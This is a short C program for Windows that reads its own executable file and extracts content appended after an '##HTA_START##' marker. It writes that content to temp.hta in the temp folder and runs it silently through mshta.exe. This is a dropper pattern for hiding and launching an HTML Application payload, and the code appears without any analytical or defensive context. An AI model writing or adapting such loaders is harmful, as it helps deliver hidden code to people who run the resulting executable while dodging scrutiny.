#include <windows.h>
#include <stdio.h>

int main() {
    char tempPath[MAX_PATH];
    char tempFile[MAX_PATH];
    DWORD bytesRead;
    HANDLE hFile = NULL;
    FILE *fp = NULL;

    GetTempPathA(MAX_PATH, tempPath);
    sprintf(tempFile, "%stemp.hta", tempPath);

    hFile = CreateFileA(__argv[0], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *buffer = (BYTE *)malloc(fileSize);
    if (!buffer) return 3;

    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        CloseHandle(hFile);
        free(buffer);
        return 4;
    }
    CloseHandle(hFile);

    BYTE marker[] = "##HTA_START##";
    BYTE *htaStart = NULL;
    for (DWORD i = 0; i < fileSize - sizeof(marker); i++) {
        if (memcmp(buffer + i, marker, sizeof(marker) - 1) == 0) {
            htaStart = buffer + i + sizeof(marker) - 1;
            break;
        }
    }

    if (!htaStart) {
        free(buffer);
        return 2;
    }

    fp = fopen(tempFile, "wb");
    if (!fp) {
        free(buffer);
        return 5;
    }

    fwrite(htaStart, 1, fileSize - (htaStart - buffer), fp);
    fclose(fp);
    free(buffer);

    ShellExecuteA(NULL, "open", "mshta.exe", tempFile, NULL, SW_SHOWNORMAL);
    return 0;
}